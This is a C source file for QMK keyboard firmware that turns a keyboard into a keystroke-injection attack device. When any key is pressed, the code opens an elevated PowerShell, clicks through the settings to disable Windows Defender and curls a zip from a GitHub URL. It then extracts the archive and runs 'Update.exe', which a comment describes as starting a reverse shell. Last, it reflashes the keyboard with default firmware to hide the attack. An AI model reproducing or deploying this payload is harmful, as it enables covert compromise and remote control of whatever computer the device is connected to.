#include "bucky.h"

static uint16_t key_timer;

// Timer function
void delay(uint16_t time) {
    key_timer = timer_read();
    while (timer_elapsed(key_timer) < time) {}
}

// Launch the system's default browser
void default_browser(void) {
    SEND_STRING(SS_TAP(X_WWW_HOME()));
}

// Opens the Run command window (Left GUI + r)
void win_run(void) {
    SEND_STRING(SS_DOWN(X_LGUI)"r"SS_UP(X_LGUI));
}

// System power down
void shutdown(void) {
   SEND_STRING(SS_TAP(X_SYSTEM_POWER));
}

// Launch PowerShell
void powershell(void) {
    win_run();
    delay(50);
    SEND_STRING("powershell");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Elevate user privileges to administrator from PowerShell
void elevate_privileges(void) {
    SEND_STRING("start-process PowerShell -verb runas");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Start PowerShell as an administrator and navigate to root
void powershell_admin(void) {
    win_run();
    delay(50);
    SEND_STRING("powershell");
    SEND_STRING(SS_DOWN(X_LCTRL)SS_DOWN(X_LSHIFT)SS_TAP(X_ENTER)SS_UP(X_LCTRL)SS_UP(X_LSHIFT));
    delay(500);
    SEND_STRING(SS_TAP(X_LEFT));
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(1000);
    // Relocate to root
    SEND_STRING("cd /");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Quit PowerShell
void exit_powershell(void) {
    SEND_STRING("exit");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Start Command Prompt as an administrator and navigate to root
void command_prompt(void) {
    win_run();
    delay(50);
    SEND_STRING("cmd");
    SEND_STRING(SS_DOWN(X_LCTRL)SS_DOWN(X_LSHIFT)SS_TAP(X_ENTER)SS_UP(X_LCTRL)SS_UP(X_LSHIFT));
    delay(500);
    SEND_STRING(SS_TAP(X_LEFT));
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(500);
    // Relocate to root
    SEND_STRING("cd /tmp");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Disable Windows Defender through the GUI
void disable_windefend(void) {
    SEND_STRING(SS_TAP(X_LGUI));
    delay(300);
    SEND_STRING("Virus & threat protection");
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(1000);
    for (int i = 0; i < 4; i++) {
        SEND_STRING(SS_TAP(X_TAB));
        delay(300);
    }
    SEND_STRING(SS_TAP(X_ENTER));
    delay(300);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(500);
    SEND_STRING(SS_TAP(X_LEFT));
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
}

// Closes the currently selected window
void close_window(void) {
    SEND_STRING(SS_DOWN(X_LALT)SS_TAP(X_F4)SS_UP(X_LALT));
}

// Initiate a reverse shell using a normal payload (assumes administrator privileges in PowerShell)
void initiate_revshell(void) {
    SEND_STRING("mkdir tmp");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING("curl https://github.com/Volanns/QMKPhantomKB/raw/main/important.zip -o \\tmp\\important.zip");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(10000);
    SEND_STRING("cd tmp");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING("tar -xf .\\important.zip");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING(".\\Update.exe");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Run the attack sequence
void exploit(void) {
    disable_windefend();
    close_window();
    delay(100);
    powershell_admin();
    delay(300);
    initiate_revshell();
    delay(100);
    exit_powershell();
}

// Flashes keyboard with default firmware
void cleanup(void) {
    command_prompt();
    SEND_STRING("flash.bat");
    SEND_STRING(SS_TAP(X_ENTER));
    reset_keyboard();
}

bool start = false;

// Called after every matrix scan
void matrix_scan_user(void) {
    if (start) {
        delay(5000);
        exploit();
        cleanup();
        // Enter DFU mode
        reset_keyboard();
    }
}

// Runs the main event after any key is pressed
bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    start = true;
    return true;
}
